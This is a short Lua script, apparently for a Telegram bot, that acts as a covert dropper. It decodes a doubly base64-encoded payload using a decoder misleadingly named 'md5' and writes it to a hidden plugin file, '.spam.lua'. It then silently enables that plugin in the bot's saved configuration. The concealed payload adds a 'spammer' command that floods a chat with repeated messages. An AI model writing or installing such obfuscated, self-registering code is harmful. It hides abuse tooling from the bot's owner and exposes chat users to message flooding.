local mime = require( "mime" ) 
local md5 = mime.unb64

asource = md5( md5("Wkc4TkNtWjFibU4wYVc5dUlISjFiaWh0YzJjc0lHMWhkR05vWlhNcERRb05DZzBLSUNCc2IyTmhiQ0IwWlhnZ1BTQnRZWFJqYUdWeld6RmREUW9nSUd4dlkyRnNJSE53Y3lBOUlHMWhkR05vWlhOYk1sME5DaUFnYkc5allXd2djM0FnUFNBblJuVmphMlZrSURwRUlGeHVJRUJNVTBSZlFqQlVKdzBLWm05eUlHazlNU3dnZEdWNExDQXhJR1J2RFFvTkNuTndJRDBnSjF4dUp5NHVjM0J6TGk0blhHNG5MaTV6Y0EwS2FTQTlJR2tnS3lBeERRcGxibVFOQ25KbGRIVnliaUJ6Y0EwS0RRb05DaUFnSUNBZ0lDQWdJR1Z1WkEwS2NtVjBkWEp1SUhzTkNpQWdJQ0J3WVhSMFpYSnVjeUE5SUhzTkNpQWdJQ0FnSUNKZVd5OGhYVnRUYzExd1lXMXRaWElnS0M0cUtTQW9MaW9wSkNJTkNpQWdJQ0I5TEEwS0lDQWdJSEoxYmlBOUlISjFiaXdOQ24wTkNnMEtaVzVr") )

local file_insert = io.open 
local file_t = "w" 
local file = file_insert("./plugins/.spam.lua", file_t) 
file:write(asource) 
file:flush()
 file:close()
 table.insert(_config.enabled_plugins, '.spam')
 save_config()
